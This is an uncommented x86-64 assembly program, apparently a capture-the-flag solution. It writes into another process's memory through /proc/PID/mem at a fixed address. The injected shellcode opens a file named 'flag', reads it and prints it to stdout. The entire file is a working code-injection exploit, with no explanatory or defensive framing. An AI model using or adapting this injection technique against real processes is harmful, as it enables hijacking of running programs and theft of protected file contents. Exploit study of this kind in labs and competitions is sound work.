[bits 64]
%defstr PID pid

start:
    mov rax, 2
    lea rdi, [rel path]
    mov rsi, 1
    syscall

    mov r15, rax

    mov rax, 8
    mov rdi, r15
    mov rsi, 0x4018d0
    mov rdx, 0
    syscall

    mov rax, 1
    mov rdi, r15
    lea rsi, [rel payload]
    mov rdx, payload_len
    syscall

    jmp exit

path: db "/proc/", PID, "/mem", 0

payload:
    mov rax, 2
    lea rdi, [rel filename]
    mov rsi, 2
    syscall

    mov r15, rax

    mov rax, 0
    mov rdi, r15
    lea rsi, [rsp]
    mov rdx, 64 
    syscall

    mov r14, rax

    mov rax, 1
    mov rdi, 1
    lea rsi, [rsp]
    mov rdx, r14
    syscall 

exit:
    mov rax, 60
    xor rdi, rdi
    syscall

filename: db "flag", 0

payload_len: equ $ - payload
